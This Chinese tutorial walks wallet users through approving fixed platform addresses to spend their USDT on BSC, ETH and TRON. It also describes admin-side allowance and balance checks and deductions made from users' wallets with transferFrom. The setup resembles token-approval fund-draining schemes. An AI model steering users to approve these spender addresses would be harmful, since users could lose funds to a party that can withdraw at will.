# 用户授权平台地址教程

## 什么是授权？

授权（Approve）是指用户允许平台智能合约从其钱包中转移指定数量的代币（如 USDT）。这是 DeFi 应用的标准操作流程。

## 为什么需要授权？

扣费功能使用 `transferFrom` 方法，需要用户事先授权平台地址才能从用户钱包中转账。这是区块链的安全机制，确保只有用户明确授权后，平台才能操作用户的资产。

---

## 平台地址

用户需要授权以下平台地址：

| 链 | 平台地址 | USDT 合约地址 |
|----|---------|--------------|
| BSC | `0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4` | `0x55d398326f99059fF775485246999027B3197955` |
| ETH | `0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d` | `0xdAC17F958D2ee523a2206206994597C13D831ec7` |
| TRON | `TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi` | `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t` |

---

## 授权方法

### 方法一：通过 DApp 充值时自动授权（推荐）

用户在 DApp 中进行充值操作时，系统会自动请求授权。这是最简单的方法。

**步骤**：
1. 访问 https://bocail.com
2. 连接钱包
3. 点击"充值"
4. 选择链（BSC/ETH/TRON）
5. 输入充值金额
6. 钱包会弹出授权请求
7. 确认授权

---

### 方法二：通过区块链浏览器授权

#### BSC 链授权

1. 访问 BSCScan: https://bscscan.com/token/0x55d398326f99059fF775485246999027B3197955#writeContract
2. 点击 "Connect to Web3" 连接钱包
3. 找到 `approve` 方法
4. 填写参数：
   - `spender`: `0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4`
   - `amount`: `1000000000000000000000`（1000 USDT，18位小数）
5. 点击 "Write" 并确认交易

#### ETH 链授权

1. 访问 Etherscan: https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#writeContract
2. 点击 "Connect to Web3" 连接钱包
3. 找到 `approve` 方法
4. 填写参数：
   - `spender`: `0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d`
   - `amount`: `1000000000`（1000 USDT，6位小数）
5. 点击 "Write" 并确认交易

#### TRON 链授权

1. 访问 TronScan: https://tronscan.org/#/contract/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/code
2. 点击 "Write Contract"
3. 连接 TronLink 钱包
4. 找到 `approve` 方法
5. 填写参数：
   - `spender`: `TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi`
   - `amount`: `1000000000`（1000 USDT，6位小数）
6. 点击 "Send" 并确认交易

---

### 方法三：通过 imToken 钱包授权

详细步骤请参考：`imToken使用教程.md`

**简要步骤**：
1. 打开 imToken 钱包
2. 选择对应链的钱包（BSC/ETH/TRON）
3. 点击"授权管理"或"DApp 浏览器"
4. 访问 USDT 合约
5. 执行 `approve` 操作
6. 填写平台地址和授权额度
7. 确认交易

---

### 方法四：通过 MetaMask 授权（BSC/ETH）

1. 打开 MetaMask 钱包
2. 切换到对应网络（BSC 或 ETH）
3. 访问区块链浏览器（BSCScan 或 Etherscan）
4. 按照"方法二"的步骤操作

---

## 授权额度说明

### 推荐授权额度

- **小额用户**：100-500 USDT
- **中等用户**：500-2000 USDT
- **大额用户**：2000-10000 USDT

### 无限授权（不推荐）

某些 DApp 会请求无限授权（`2^256-1`），虽然方便，但存在安全风险。建议授权具体金额。

### 授权额度计算

**BSC 链**（18位小数）：
- 100 USDT = `100000000000000000000`
- 1000 USDT = `1000000000000000000000`

**ETH/TRON 链**（6位小数）：
- 100 USDT = `100000000`
- 1000 USDT = `1000000000`

---

## 查询授权状态

### 管理员查询

在管理后台使用 API：

```bash
# BSC
curl "https://bocail.com/api/admin/users/check-allowance?wallet_address=0x...&chain=BSC"

# ETH
curl "https://bocail.com/api/admin/users/check-allowance?wallet_address=0x...&chain=ETH"

# TRON
curl "https://bocail.com/api/admin/users/check-allowance?wallet_address=T...&chain=TRON"
```

返回示例：
```json
{
  "success": true,
  "data": {
    "allowance": "1000.0000",
    "balance": "500.0000",
    "platform_address": "0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4",
    "chain": "BSC"
  }
}
```

### 用户自查

**通过区块链浏览器**：
1. 访问对应的区块链浏览器
2. 进入 USDT 合约页面
3. 点击 "Read Contract"
4. 找到 `allowance` 方法
5. 输入：
   - `owner`: 用户钱包地址
   - `spender`: 平台地址
6. 点击 "Query" 查看授权额度

---

## 常见问题

### Q1: 授权需要 Gas 费吗？

A: 是的，授权是一笔链上交易，需要支付 Gas 费：
- **BSC**: 约 0.0001-0.0005 BNB
- **ETH**: 约 0.001-0.01 ETH（取决于网络拥堵情况）
- **TRON**: 约 5-15 TRX（能量费）

### Q2: 授权是一次性的吗？

A: 不是。授权是一个额度，平台可以在这个额度内多次扣费，直到额度用完。

### Q3: 如何取消授权？

A: 再次执行 `approve` 操作，将授权额度设置为 `0` 即可。

### Q4: 授权安全吗？

A: 授权本身是安全的，但要注意：
- 只授权给可信的平台地址
- 不要授权过大的额度
- 定期检查和管理授权

### Q5: 授权后多久生效？

A: 授权交易确认后立即生效：
- **BSC**: 约 3 秒
- **ETH**: 约 15 秒 - 1 分钟
- **TRON**: 约 3 秒

### Q6: 可以修改授权额度吗？

A: 可以。再次执行 `approve` 操作，设置新的授权额度即可。

**注意**：某些代币（如 USDT）要求先将授权额度设置为 0，再设置新额度。

---

## 授权管理最佳实践

1. **定期检查授权**
   - 定期查看钱包的授权列表
   - 取消不再使用的授权

2. **合理设置额度**
   - 根据实际需求设置授权额度
   - 避免授权过大金额

3. **使用硬件钱包**
   - 大额资产建议使用硬件钱包
   - 提高安全性

4. **保持警惕**
   - 不要授权给不明地址
   - 警惕钓鱼网站

---

## 测试授权

### 测试步骤

1. **准备测试钱包**
   - 确保钱包有少量 USDT（如 10 USDT）
   - 确保钱包有足够的 Gas 费

2. **执行授权**
   - 按照上述方法授权平台地址
   - 授权额度：10-100 USDT

3. **验证授权**
   - 使用 API 查询授权状态
   - 确认授权额度正确

4. **测试扣费**
   - 在管理后台执行小额扣费（如 1 USDT）
   - 验证扣费成功

---

## 技术支持

如有问题，请联系技术支持：

- 查看后端日志：`pm2 logs vitu-backend`
- 查看区块链浏览器确认交易状态
- 检查钱包余额和授权状态

---

## 相关文档

- `imToken使用教程.md` - imToken 钱包授权详细教程
- `钱包扣费功能说明.md` - 扣费功能完整说明
- `TRON扣费功能完成.md` - TRON 链扣费开发文档

---

**重要提示**：
- 授权操作不可逆，请谨慎操作
- 只授权给官方平台地址
- 定期检查和管理授权
- 保护好钱包私钥和助记词
